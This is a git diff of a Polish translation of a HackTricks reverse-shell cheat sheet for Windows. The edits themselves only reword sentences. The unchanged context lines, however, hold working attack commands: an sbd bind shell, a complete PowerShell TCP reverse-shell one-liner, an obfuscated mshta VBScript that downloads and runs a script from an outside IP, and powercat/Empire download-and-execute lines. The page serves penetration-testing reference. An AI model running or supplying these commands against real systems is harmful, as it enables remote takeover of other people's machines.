@@ -39,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcat**. Działa na systemach podobnych do Unix i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, konfigurowalne porty źródłowe i ciągłe ponowne łączenie, sbd oferuje wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników systemu Windows wersja sbd.exe z dystrybucji Kali Linux może być używana jako niezawodny zamiennik dla Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcat**. Działa na systemach podobnych do Unix i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, konfigurowalne porty źródłowe i ciągłe ponowne łączenie, sbd oferuje wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników Windows wersja sbd.exe z dystrybucji Kali Linux może być używana jako niezawodny zamiennik dla Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -99,13 +99,13 @@ Payload zapisany na dysku: **NIE** (_przynajmniej nigdzie nie mogłem znaleźć 
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Proces wykonujący wywołanie sieciowe: **svchost.exe**\
-Payload zapisany na dysku: **Lokalna pamięć podręczna klienta WebDAV**
+Payload zapisany na dysku: **lokalna pamięć podręczna klienta WebDAV**
 
 **Jedna linia:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Uzyskaj więcej informacji o różnych powłokach Powershell na końcu tego dokumentu**
+**Uzyskaj więcej informacji na temat różnych powłok Powershell na końcu tego dokumentu**
 
 ## Mshta
 
@@ -121,7 +121,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Przykład odwrotnej powłoki hta-psh (użyj hta do pobrania i wykonania tylnej furtki PS)**
+#### **Przykład odwrotnej powłoki hta-psh (użyj hta do pobrania i wykonania tylnego wejścia PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -436,7 +436,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Utwórz launcher powershell, zapisz go w pliku i pobierz oraz uruchom go.
+Utwórz launcher powershell, zapisz go w pliku, a następnie pobierz i uruchom.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -464,7 +464,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) konsola PS z preładowanymi niektórymi ofensywnymi modułami PS (szyfrowany)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) konsola PS z niektórymi ofensywnymi modułami PS i wykrywaniem proxy (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) konsola PS z niektórymi ofensywnymi modułami PS i detekcją proxy (IEX)
 
 ## Odniesienia
 
@@ -487,7 +487,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
